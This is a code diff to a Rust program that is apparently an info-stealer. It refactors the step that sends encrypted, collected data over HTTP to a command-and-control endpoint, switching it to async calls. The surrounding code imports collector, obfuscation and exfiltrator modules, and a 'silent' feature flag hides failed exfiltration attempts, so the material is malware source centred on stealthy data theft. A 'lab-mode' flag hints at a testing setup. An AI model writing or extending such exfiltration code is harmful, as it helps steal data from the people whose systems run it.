@@ -232,7 +232,7 @@ fn print_banner() {
 async fn run_collection(config: &Config) -> anyhow::Result<String> {
     use collectors::CollectorManager;
     use crypto::{CryptoManager, obfuscation};
-    use exfil::{LocalExfiltrator, HttpExfiltrator, Exfiltrator};
+    use exfil::{LocalExfiltrator, HttpExfiltrator};
 
     std::fs::create_dir_all(&config.output_dir)?;
 
@@ -259,12 +259,13 @@ async fn run_collection(config: &Config) -> anyhow::Result<String> {
 
     // Exfiltrar via HTTP para C2 (se configurado)
     if let Some(ref endpoint) = config.exfil_config.http_endpoint {
+        let http_exfil = HttpExfiltrator::new(endpoint);
+        
         match config.exfil_config.exfil_type {
             config::ExfilType::Http => {
-                let http_exfil = HttpExfiltrator::new(endpoint);
-                if http_exfil.check_connection() {
-                    if let Err(_e) = http_exfil.send(&encrypted) {
-                        // Silencioso - falha não é crítica
+                // Usar versão async diretamente
+                if http_exfil.check_connection_async().await {
+                    if let Err(_e) = http_exfil.send_async(&encrypted).await {
                         #[cfg(not(feature = "silent"))]
                         tracing::warn!("HTTP exfil failed: {}", _e);
                     }
@@ -274,8 +275,7 @@ async fn run_collection(config: &Config) -> anyhow::Result<String> {
                 // LocalFile ou DNS - tenta HTTP de qualquer forma em lab mode
                 #[cfg(feature = "lab-mode")]
                 {
-                    let http_exfil = HttpExfiltrator::new(endpoint);
-                    let _ = http_exfil.send(&encrypted);
+                    let _ = http_exfil.send_async(&encrypted).await;
                 }
             }
         }
